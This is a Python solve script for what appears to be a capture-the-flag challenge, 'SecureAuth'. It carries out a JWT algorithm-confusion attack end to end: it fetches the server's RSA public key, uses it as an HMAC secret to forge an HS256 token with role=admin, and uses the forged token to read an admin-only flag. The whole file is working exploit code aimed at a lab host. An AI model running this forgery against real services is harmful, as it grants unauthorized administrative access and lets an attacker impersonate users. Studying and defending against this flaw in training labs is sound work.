#!/usr/bin/env python3
"""
SecureAuth — Reference solve script
Vulnerability: JWT Algorithm Confusion (RS256 -> HS256)

Attack:
  1. Register + login to get a valid RS256 JWT
  2. Fetch the RSA public key from /api/jwks
  3. Forge a new JWT with role=admin, sign it with HS256 using the PEM public key as secret
  4. Access /api/admin/flag with the forged token

Requirements:
    pip install pyjwt cryptography requests

Usage:
    python solve.py <host> [port]
    python solve.py localhost 8082
"""

import sys
import time
import json

try:
    import jwt
    import requests
except ImportError:
    print("[!] Missing dependencies. Run: pip install pyjwt cryptography requests")
    sys.exit(1)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = sys.argv[2] if len(sys.argv) > 2 else "8082"
    base = f"http://{host}:{port}"
    s = requests.Session()

    print(f"[*] Target: {base}")

    # Step 1 — Register a user account
    print("\n[1] Registering user account...")
    reg = s.post(f"{base}/api/register", json={"username": "attacker", "password": "hunter2"})
    print(f"    Status: {reg.status_code} — {reg.json()}")

    # Step 2 — Login to get a valid RS256 token
    print("\n[2] Logging in to obtain RS256 JWT...")
    login_resp = s.post(f"{base}/api/login", json={"username": "attacker", "password": "hunter2"})
    login_data = login_resp.json()
    user_token = login_data.get("token", "")
    print(f"    Algorithm: {login_data.get('algorithm')}")
    print(f"    Token (truncated): {user_token[:60]}...")

    # Step 3 — Decode token to inspect payload (no verification)
    decoded = jwt.decode(user_token, options={"verify_signature": False}, algorithms=["RS256"])
    print(f"\n[3] Decoded payload: {json.dumps(decoded, indent=2)}")
    print(f"    Current role: {decoded.get('role')}")

    # Step 4 — Fetch the RSA public key
    print("\n[4] Fetching RSA public key from /api/jwks...")
    jwks_resp = s.get(f"{base}/api/jwks")
    jwks_data = jwks_resp.json()
    public_key_pem = jwks_data.get("public_key", "")
    print(f"    Algorithm declared: {jwks_data.get('algorithm')}")
    print(f"    Public key (first line): {public_key_pem.splitlines()[0]}")

    # Step 5 — Forge HS256 token using PEM public key as HMAC secret
    print("\n[5] Forging JWT with HS256 using public key as HMAC secret...")
    forged_payload = {
        "sub": "attacker",
        "role": "admin",   # <-- escalated privilege
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    # The server tries HS256 with the PEM public key as the secret
    # We sign with the same key material — this is the confusion attack
    forged_token = jwt.encode(forged_payload, public_key_pem, algorithm="HS256")
    print(f"    Forged token (truncated): {forged_token[:60]}...")

    # Step 6 — Verify forged token works on /api/me
    print("\n[6] Verifying forged token on /api/me...")
    me_resp = s.get(f"{base}/api/me", headers={"Authorization": f"Bearer {forged_token}"})
    me_data = me_resp.json()
    print(f"    Response: {json.dumps(me_data, indent=2)}")

    # Step 7 — Access /api/admin/flag with forged token
    print("\n[7] Accessing /api/admin/flag with forged admin token...")
    flag_resp = s.get(f"{base}/api/admin/flag", headers={"Authorization": f"Bearer {forged_token}"})
    flag_data = flag_resp.json()
    print(f"    Status: {flag_resp.status_code}")
    print(f"    Response: {json.dumps(flag_data, indent=2)}")

    flag = flag_data.get("flag", "")
    if flag:
        print(f"\n[FLAG] {flag}")
    else:
        print("\n[?] Flag not found in response. Check the output above.")


if __name__ == "__main__":
    main()
